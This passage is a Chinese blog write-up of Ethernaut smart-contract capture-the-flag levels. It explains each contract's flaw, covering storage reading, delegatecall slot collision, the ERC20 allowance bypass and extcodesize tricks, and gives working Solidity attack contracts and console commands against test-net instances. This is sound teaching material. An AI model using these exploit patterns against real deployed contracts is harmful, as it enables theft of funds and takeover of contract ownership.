*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^         ,---&#x2F;V\</span><br><span class="line">      &#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.    ~|__(o.o)</span><br><span class="line">      ^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;  UU  UU</span><br><span class="line">  *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：将<code>locked</code>改为<code>false</code></p>
<p>跟<code>Vault</code>关卡很像，可以说是它的升级版，在这里就得好好说一下solidity中的状态变量存储方式了，参考<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html" target="_blank" rel="noopener">【官方文档】</a>，我们可知：</p>
<blockquote>
<p>存储大小少于 32 字节的多个变量会被打包到一个 存储插槽storage slot 中，规则如下：</p>
<ul>
<li>存储插槽storage slot 的第一项会以低位对齐的方式储存。</li>
<li>值类型仅使用存储它们所需的字节。</li>
<li>如果 存储插槽storage slot 中的剩余空间不足以储存一个值类型，那么它会被存入下一个 存储插槽storage slot 。</li>
<li>结构体（struct）和数组数据总是会开启一个新插槽（但结构体或数组中的各元素，则按规则紧密打包）。</li>
<li>结构体和数组之后的数据也或开启一个新插槽。</li>
</ul>
</blockquote>
<p>由于 映射mapping 和动态数组不可预知大小，不能在状态变量之间存储他们。相反，他们自身根据 <a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html#storage-inplace-encoding" target="_blank" rel="noopener">以上规则</a> 仅占用 32 个字节，然后他们包含的元素的存储的其实位置，则是通过 Keccak-256 哈希计算来确定，比较复杂，可以在<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html" target="_blank" rel="noopener">【文档】</a>中查看，这里不涉及，就不带大家看了。</p>
<p>因此根据变量类型和对应占用字节数，<code>Privacy</code>中的存储分布大致如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----------------------------------------------------------------</span><br><span class="line">|              unused (30)                         | locked (1)| &lt;- slot 0</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                          ID (32)                             | &lt;- slot 1</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|   unused(28)   | awkwardness(2)|denomination(1)|flattening(1)| &lt;- slot 2</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                         data[0] (32)                         | &lt;- slot 3</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                         data[1] (32)                         | &lt;- slot 4</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                         data[2] (32)                         | &lt;- slot 5</span><br><span class="line">----------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>因此我们使用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="string">"5"</span>)</span><br><span class="line">&gt; <span class="string">'0xa264a1b3d12c27658b731ce1c5c631521539801e9e246f3c0e3e03dd408a8de8'</span></span><br></pre></td></tr></table></figure>

<p>就可以获取<code>data[2]</code>了，但是<code>bytes16(data[2])</code>会截取其低位的值，又因为对其方式，因此<code>a264a1b3d12c27658b731ce1c5c63152</code>才是我们想要的结果。</p>
<h2 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft() % 8191 &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) !&#x3D; uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：正常执行完<code>enter</code>函数。</p>
<p>我们先来看看，如何绕过三个<code>gate</code>函数，第一个可以参照<code>Telephone</code>关卡，借助第三方合约即可。</p>
<p>对于第二个函数，<code>gasleft()</code>返回的是当前可用的<code>gas</code>，这个要你知道该合约运行到这一行时候，所消耗的<code>gas</code>，需要我们直到题目使用的编译器，然后放到本地调试，这种方法太麻烦了，所以我选择枚举，即调用时候设置gas为<code>n*8191+x</code>，不断改变x，再调用即可。</p>
<p>对于第三个函数，假设<code>_gatekey</code>可以被下面数字表示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xab cd ef gh ij kl mn op</span><br></pre></td></tr></table></figure>

<p>对于第一个条件，要求<code>ijklmnop==0000mnop</code>,即<code>ijkl=0000</code>，</p>
<p>对于第二个条件，要求<code>00000000ijklmnop!=abcdefghijklmnop</code>，即<code>00000000!=abcdefgh</code></p>
<p>第三个条件，要求<code>ijklmnop==0000xxxx</code>，其中，<code>xxxx</code>是<code>tx.origin</code>的低两个字节。</p>
<p>故，满足条件的一个<code>_gateKey</code>为<code>1111111100001df4</code>（我的metamask账户的最低两字节是<code>1df4</code>）</p>
<p>综上，我们可以借助下面的攻击合约：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOneAttack &#123;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        &#x2F;&#x2F; 	该地址可以在控制台中输入 &#96;instance&#96; 获取</span><br><span class="line">        address _addr &#x3D; 0x8F29B1467240Ccd340BD33371559cC76729b8e27;</span><br><span class="line">        bytes8 _gateKey &#x3D; 0x1111111100001df4;</span><br><span class="line">        for(uint x &#x3D; 0; x &lt; 8191; x +&#x3D; 1)&#123;</span><br><span class="line">            (bool success, bytes memory data) &#x3D; _addr.call&#123;gas: 81910 + x&#125;(</span><br><span class="line">                abi.encodeWithSignature(&quot;enter(bytes8)&quot;, _gateKey)</span><br><span class="line">            );</span><br><span class="line">            if(success)&#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x :&#x3D; extcodesize(caller()) &#125;</span><br><span class="line">    require(x &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) &#x3D;&#x3D; type(uint64).max);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：正常执行完<code>enter</code>函数。</p>
<p>关于第一个条件，参照关卡【Gatekeeper One】即可。</p>
<p>但是第二个条件又要要求调用者的地址上不能没有代码，即貌似调用者必须是一个外部账户（EOA）？其实不然，如果一个合约，在构造函数运行阶段，对该地址调用<code>extcodesize</code>，则返回的是零，我们利用这一点即可。</p>
<p>对于第三个，先是对我们的调用方的地址进行打包，又进行计算哈希，又是转数组，又是转64位无符号整数的，最后还要和一个数字异或，看似很复杂，其实，我们可用使用异或的逆操作，即：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x ^ y &#x3D; z</span><br><span class="line">则 x &#x3D; y ^ z</span><br></pre></td></tr></table></figure>

<p>最终，攻击的合约如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwoAttack &#123;</span><br><span class="line">     constructor()  &#123;</span><br><span class="line">        &#x2F;&#x2F; 	该地址可以在控制台中输入 &#96;instance&#96; 获取</span><br><span class="line">        address _addr &#x3D; 0x0aD80881e0C2b8294beA62b5916Bb0029b93922e;</span><br><span class="line">        bytes8 _gateKey &#x3D; bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(this)))));</span><br><span class="line">    	_addr.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;enter(bytes8)&quot;, _gateKey)</span><br><span class="line">            );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#39;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&#39;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; string public constant name &#x3D; &#39;NaughtCoin&#39;;</span><br><span class="line">  &#x2F;&#x2F; string public constant symbol &#x3D; &#39;0x0&#39;;</span><br><span class="line">  &#x2F;&#x2F; uint public constant decimals &#x3D; 18;</span><br><span class="line">  uint public timeLock &#x3D; block.timestamp + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) </span><br><span class="line">  ERC20(&#39;NaughtCoin&#39;, &#39;0x0&#39;) &#123;</span><br><span class="line">    player &#x3D; _player;</span><br><span class="line">    INITIAL_SUPPLY &#x3D; 1000000 * (10**uint256(decimals()));</span><br><span class="line">    &#x2F;&#x2F; _totalSupply &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    &#x2F;&#x2F; _balances[player] &#x3D; INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender &#x3D;&#x3D; player) &#123;</span><br><span class="line">      require(block.timestamp &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：将您的代币余额变成零。</p>
<p>乍一看上去，由于十年期限的限制，我们无法使用<code>transfer</code>进行转账，但是实际上该代币是<code>ERC20</code>代币的实现，该代币接口中有一个授权转账的函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address spender &#x3D; _msgSender();</span><br><span class="line">        _spendAllowance(from, spender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual &#123;</span><br><span class="line">        uint256 currentAllowance &#x3D; allowance(owner, spender);</span><br><span class="line">        if (currentAllowance !&#x3D; type(uint256).max) &#123;</span><br><span class="line">            require(currentAllowance &gt;&#x3D; amount, &quot;ERC20: insufficient allowance&quot;);</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                _approve(owner, spender, currentAllowance - amount);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>但是使用该函数有个前提条件，即<code>msg.sender</code>要获得<code>from</code>的授权，授权代币额度大于等于<code>amount</code>。</p>
<p>因此我们要给自己授权，该函数实现如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address owner &#x3D; _msgSender();</span><br><span class="line">        _approve(owner, spender, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>spender</code>是被授权方。</p>
<p>因此依次在控制台输入如下即可：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.approve(player,<span class="string">'1000000000000000000000000'</span>)</span><br><span class="line"><span class="keyword">await</span> contract.transferFrom(player,<span class="string">'0x34a2Bdc713002B5b7c80F20233b306977aD3B64E'</span>,<span class="string">'1000000000000000000000000'</span>)</span><br></pre></td></tr></table></figure>

<p><code>0x34a2Bdc713002B5b7c80F20233b306977aD3B64E</code>是一个合法的第三方账户。</p>
<h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  &#x2F;&#x2F; Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature &#x3D; bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;</span><br><span class="line">    timeZone1Library &#x3D; _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library &#x3D; _timeZone2LibraryAddress; </span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime &#x3D; _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：获得合约所有权。</p>
<p>我们先来回顾一下<code>delegatecall</code>的用法</p>
<p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230218130226.png" alt></p>
<p>实际上，你可以粗略地理解成我们把目标合约的函数代码给拿了过来，放在我们当前合约中执行，修改的是当前合约的变量，相当于引入库函数的功能。</p>
<p>我们先来看一下<code>Preservation</code>合约的存储：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---------------------------------------</span><br><span class="line">|  unused (12) | timeZone1Library (20)| &lt;- slot 0</span><br><span class="line">---------------------------------------</span><br><span class="line">|  unused (12) | timeZone2Library (20)| &lt;- slot 1</span><br><span class="line">---------------------------------------</span><br><span class="line">|  unused (12) |       owner (20)     | &lt;- slot 2</span><br><span class="line">---------------------------------------</span><br><span class="line">|            storedTime (32)          | &lt;- slot 3</span><br><span class="line">---------------------------------------</span><br><span class="line">|    unused (28) |setTimeSignature (4)| &lt;- slot 4</span><br><span class="line">---------------------------------------</span><br></pre></td></tr></table></figure>

<p>再来看看<code>LibraryContract</code>合约的存储：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---------------------------------------</span><br><span class="line">|            storedTime (32)          | &lt;- slot 0</span><br><span class="line">---------------------------------------</span><br></pre></td></tr></table></figure>

<p>由于变量<code>storedTime</code>在<code>LibraryContract</code>合约中，是在<code>slot 0</code>的位置，因此当<code>Preservation</code>调用<code>setFirstTime</code>的时候，由于<code>delegatecall</code>的特性，修改的是其<code>slot 0</code>处的变量，即变量<code>timeZone1Library</code>，也就是说，我们可将其设置为一个恶意地址，指向一个恶意合约，然后恶意中修改<code>owner</code>变量即可。</p>
<p>攻击合约如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract PreservationAttack &#123;</span><br><span class="line"></span><br><span class="line">  address public foo1;</span><br><span class="line">  address public foo2;</span><br><span class="line">  address public storedTime; </span><br><span class="line"></span><br><span class="line"> function setTime(uint _time) public &#123;</span><br><span class="line"> &#x2F;&#x2F; storedTime 是在 slot 2 的位置，因此将来修改的是 owner</span><br><span class="line">    storedTime &#x3D; address(uint160(_time));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们先部署上述合约，获得其地址<code>0x5F100674E2b7b3Ff0C3E93582151fA16E75e96eD</code>，然后在控制台输入：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.setFirstTime(<span class="string">'0x5F100674E2b7b3Ff0C3E93582151fA16E75e96eD'</span>)</span><br></pre></td></tr></table></figure>

<p>再调用函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.setFirstTime(player)</span><br></pre></td></tr></table></figure>

<p>即可完成修改。</p>
<h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F;generate tokens</span><br><span class="line">  function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">    new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;</span><br><span class="line">    name &#x3D; _name;</span><br><span class="line">    balances[_creator] &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; msg.value * 10;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;&#x3D; _amount);</span><br><span class="line">    balances[msg.sender] &#x3D; balances[msg.sender] - _amount;</span><br><span class="line">    balances[_to] &#x3D; _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：找回已部署的<code>SimpleToken</code>合约。</p>
<p> 该关卡考察的应该是如何根据合约地址去追踪历史交易。</p>
<p>我们先在控制台输入<code>instance</code>，获取关卡实例地址，注意，这不是合约<code>SimpleToken</code>的地址，得到该实力地址以后，打开浏览器，输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sepolia.etherscan.io&#x2F;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>我用的是sepolia测试网，如果使用的是其他测试网，要相应地修改地址</p>
</blockquote>
<p>输入实力地址，并选择internal transaction，找到最新的记录</p>
<p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230304132643.png" alt></p>
<p>点击【Contract Creation】，进去后得到一个地址<code>0x502C2D61E236119acEe7E973cb7fB1cd180AcB8f</code>，而且该地址账户拥有0.001ether，实际上该地址就是我们要找的合约地址，我们只要调用该地址上面的<code>destroy</code>函数即可，我们可用通关部署一下合约进行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract RecoveryAttack &#123;</span><br><span class="line">&#x2F;&#x2F; 在控制台输入  player 获得对应地址</span><br><span class="line">  constructor(address _player)&#123;</span><br><span class="line">  </span><br><span class="line">  	address(0x502C2D61E236119acEe7E973cb7fB1cd180AcB8f).call(</span><br><span class="line">  		abi.encodeWithSignature(&quot;destroy(address)&quot;, _player)</span><br><span class="line">  	);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver &#x3D; _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line">    ____________&#x2F;\\\_______&#x2F;\\\\\\\\\_____        </span><br><span class="line">     __________&#x2F;\\\\\_____&#x2F;\\\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\___       </span><br><span class="line">      ________&#x2F;\\\&#x2F;\\\____\&#x2F;&#x2F;&#x2F;______\&#x2F;&#x2F;\\\__      </span><br><span class="line">       ______&#x2F;\\\&#x2F;\&#x2F;\\\______________&#x2F;\\\&#x2F;___     </span><br><span class="line">        ____&#x2F;\\\&#x2F;__\&#x2F;\\\___________&#x2F;\\\&#x2F;&#x2F;_____    </span><br><span class="line">         __&#x2F;\\\\\\\\\\\\\\\\_____&#x2F;\\\&#x2F;&#x2F;________   </span><br><span class="line">          _\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;\\\&#x2F;&#x2F;____&#x2F;\\\&#x2F;___________  </span><br><span class="line">           ___________\&#x2F;\\\_____&#x2F;\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\&#x2F;&#x2F;&#x2F;_____\&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;__</span><br><span class="line">  *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：部署一个合约</p>
<p>我们需要部署一个合约<code>Solver</code>，该合约中会返回一个数字，和<code>whatIsTheMeaningOfLife()</code>对应，实际上是42（<del>别问我怎么知道，问就是网友说的</del>）.还要要求该合约中的字节码不超过10个。</p>
<p>本关卡好难，直接去网上看别人的做法！</p>
<blockquote>
<p>参考链接<a href="https://paper.seebug.org/790/" target="_blank" rel="noopener">【以太坊智能合约静态分析】</a>、<a href="https://www.ethervm.io/" target="_blank" rel="noopener">【ethervm.io】</a>【<a href="https://xz.aliyun.com/t/11159#toc-9】" target="_blank" rel="noopener">https://xz.aliyun.com/t/11159#toc-9】</a></p>
</blockquote>
<p>智能合约编译后的字节码，分为三个部分：部署代码、runtime代码、auxdata。</p>
<p>当然，auxdata是源码的加密指纹，用来验证。这只是数据，永远不会被EVM执行。</p>
<p>以太坊虚拟机在创建合约的时候，会先创建一个合约账户，然后运行部署代码。运行完成后它会将<strong>runtime代码+auxdata 存储到区块链上</strong>。之后再把二者的存储地址跟合约账户关联起来(也就是把合约账户中的code hash字段用该地址赋值)，这样就完成了合约的部署。而我们本关卡主要是从runtime代码入手。</p>
<p>如果我们要返回42，则最后的字节码必须是<code>RETURN</code>，使用该字节码时候，将会依次从栈中取两个元素，作为偏移量<code>offset</code>和长度<code>length</code>，最终返回的内容是<code>memory[offset:offset+length]</code>，因此我们要在<code>RETURN</code>上面将偏移量和长度写进栈中，然后在此之上，再写入42到内存<code>memory</code>中。具体如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">偏移    汇编指令对应二进制（16进制）实际汇编指令</span><br><span class="line">0000    602a                 PUSH1 0x2a</span><br><span class="line">0002    6050                 PUSH1 0x50</span><br><span class="line">0004    52                   mstore</span><br><span class="line">0007    6020                 PUSH1 0x20</span><br><span class="line">0009    6050                 PUSH1 0x50</span><br><span class="line">000B    F3                   RETURN</span><br></pre></td></tr></table></figure>

<p>前三行是写入42，后三行是设置<code>return</code>的内容.设置偏移量为<code>0x50</code>是因为我们的低部分位置放了代码。</p>
<p>上述的汇编作为<code>runtime</code>代码，刚好10个字节，即10个<code>opcode</code>（以太坊中，一个字节码占用一个字节）。</p>
<p>下一步，我们要通过部署代码，将<code>runtime</code>代码写入区块链；在部署代码这一块，写入代码需要使用<code>CODECOPY</code>，该操作码会依次从栈中取出三个操作数<code>destOffset</code>、<code>offset</code>、<code>length</code>，即完成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">memory[destOffset:destOffset+length] &#x3D; msg.data[offset:offset+length]</span><br></pre></td></tr></table></figure>

<p>因此这一段的汇编如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">偏移    汇编指令对应二进制（16进制）实际汇编指令</span><br><span class="line">0000    600a            PUSH1 0x0a</span><br><span class="line">0002    600c            PUSH1 0x0c</span><br><span class="line">0004    6000            PUSH1 0x00</span><br><span class="line">0006    39              CODECOPY</span><br><span class="line">0007    600a            PUSH1 0x0a</span><br><span class="line">0009    6000            PUSH1 0x00</span><br><span class="line">000B    F3              RETURN</span><br></pre></td></tr></table></figure>

<p>第一次<code>push</code>的是<code>0x0a</code>，这是runtime代码的长度，第二次<code>push</code>的是<code>0x0c</code>，是因为我们的部署代码的长度是12个字节，我们将<code>runtime</code>代码附在部署代码后面，则<code>runtime</code>代码的偏移量是<code>0x0c</code>，第三次<code>push</code>的是<code>0x00</code>，是因为我们打算将我们的<code>runtime</code>代码保存到内存<code>memory</code>的<code>slot 0</code>处。最后是将<code>memory</code>的空间扩展到<code>len=0x0a</code>(如果之前不足的话) 并返回部署后的字节码.最终的汇编如下：</p>
